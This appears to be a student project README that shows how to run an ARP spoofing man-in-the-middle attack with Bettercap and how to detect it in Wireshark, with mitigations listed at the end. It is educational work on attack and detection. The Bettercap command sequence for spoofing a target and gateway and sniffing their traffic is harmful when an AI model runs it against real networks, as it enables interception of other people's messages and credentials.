# Network Attack Project: ARP Spoofing and Detection

This project demonstrates how to perform an ARP spoofing attack using **Bettercap** and how to detect such an attack using **Wireshark**. The goal is to analyze network vulnerabilities, understand how attackers intercept and modify data, and learn how to detect and prevent such attacks.

---

## Table of Contents
1. [Project Overview](#project-overview)
2. [Key Objectives](#key-objectives)
3. [Network Setup](#network-setup)
4. [Tool Selection and Utilization](#tool-selection-and-utilization)
5. [ARP Spoofing Attack with Bettercap](#arp-spoofing-attack-with-bettercap)
6. [Detecting ARP Spoofing with Wireshark](#detecting-arp-spoofing-with-wireshark)
7. [Results and Observations](#results-and-observations)
8. [Troubleshooting](#troubleshooting)
9. [Recommendations](#recommendations)
10. [Conclusion](#conclusion)

---

## Project Overview

This project focuses on **ARP spoofing**, a type of man-in-the-middle (MitM) attack where an attacker intercepts and potentially modifies network traffic between two devices. We use **Bettercap** to perform the attack and **Wireshark** to detect it. The project also includes steps to analyze intercepted traffic and identify sensitive information.

---

## Key Objectives

- **Conduct ARP spoofing** to intercept and sniff network traffic using Bettercap.
- **Analyze intercepted traffic** to identify sensitive information.
- **Detect ARP spoofing attacks** using Wireshark by analyzing ARP packets.
- **Understand the vulnerabilities** associated with data transmission and how to mitigate them.

---

## Network Setup

Before starting, ensure the following:

1. **Bettercap** is installed on a system with network access permissions.
2. All devices are connected to the **same subnet**.
3. **Wireshark** is installed and configured to capture traffic on the correct network interface.

---

## Tool Selection and Utilization

### Bettercap
- **Bettercap** is a powerful network monitoring and attack tool. It can perform ARP spoofing, DNS spoofing, and other MitM attacks.
- **Installation**:
  ```bash
  sudo apt-get update
  sudo apt-get install bettercap
  ```

### Wireshark
- **Wireshark** is a network protocol analyzer that provides deep visibility into network traffic. It can detect ARP spoofing by analyzing ARP traffic and identifying unusual patterns.
- **Installation**:
  ```bash
  sudo apt-get update
  sudo apt-get install wireshark
  ```

---

## ARP Spoofing Attack with Bettercap

### Step 1: Launch Bettercap
Run Bettercap with root privileges:
```bash
sudo bettercap
```

### Step 2: Enable ARP Spoofing
Enable ARP spoofing and specify the target IP and gateway IP:
```bash
arp.spoof on
set arp.spoof.targets TARGET_IP
set arp.spoof.targets GATEWAY_IP
```

### Step 3: Enable Network Probing
Enable the `net.probe` module to scan for devices on the network:
```bash
net.probe on
```

### Step 4: View Connected Devices
View all connected devices on the network:
```bash
net.show
```

### Step 5: Enable Packet Capture
Enable packet capture to log intercepted traffic:
```bash
net.sniff on
```

---

## Detecting ARP Spoofing with Wireshark

### Step 1: Launch Wireshark
Start Wireshark and select the appropriate network interface.

### Step 2: Capture Traffic
Start capturing packets and apply an ARP filter:
```bash
arp
```

### Step 3: Analyze ARP Packets
- Look for **multiple ARP responses** for the same IP address.
- Check for **different MAC addresses** claiming the same IP.
- Identify **unusual ARP traffic volume** or suspicious MAC addresses.

---

## Results and Observations

### ARP Spoofing Results
- **Intercepted Traffic**: Real-time user activity, such as WhatsApp messages, media files, and unencrypted login credentials, can be intercepted.
- **Analysis**: ARP spoofing redirects traffic to the attacker's machine, allowing them to view or modify it.

### Wireshark Detection Results
- **Multiple ARP Responses**: Different MAC addresses claiming the same IP address indicate an ARP spoofing attack.
- **Unusual Traffic Volume**: A high volume of ARP requests and responses suggests an ongoing attack.
- **Suspicious MAC Addresses**: Unusual MAC addresses may belong to the attacker's machine.

---

## Troubleshooting

### Common Issues and Solutions

1. **Network Devices Not Appearing in `net.probe` Results**:
   - **Solution**: Restart Bettercap or the network interface and re-enable `net.probe`.

2. **ARP Spoofing Fails to Intercept Traffic**:
   - **Solution**: Ensure target devices are on the same network segment and do not have static ARP entries.

3. **Wireshark Not Capturing Traffic**:
   - **Solution**: Ensure the correct network interface is selected. Use `ifconfig` or `ip a` to verify the interface.

---

## Recommendations

- **Use HTTPS**: Encrypt sensitive data transmission to prevent interception.
- **Implement Network Segmentation**: Limit the scope of ARP and DNS spoofing attacks by segmenting the network.
- **Monitor ARP Traffic**: Regularly monitor ARP traffic for unusual patterns using tools like Wireshark.

---

## Conclusion

This project demonstrates how ARP spoofing can be used to intercept network traffic and how to detect such attacks using Wireshark. By understanding these vulnerabilities, network administrators can take steps to secure their networks and prevent unauthorized access.

---

**Presented by Georges Machhour **

For more details, refer to the full project documentation in the attached PDF inside the folders in this repo.
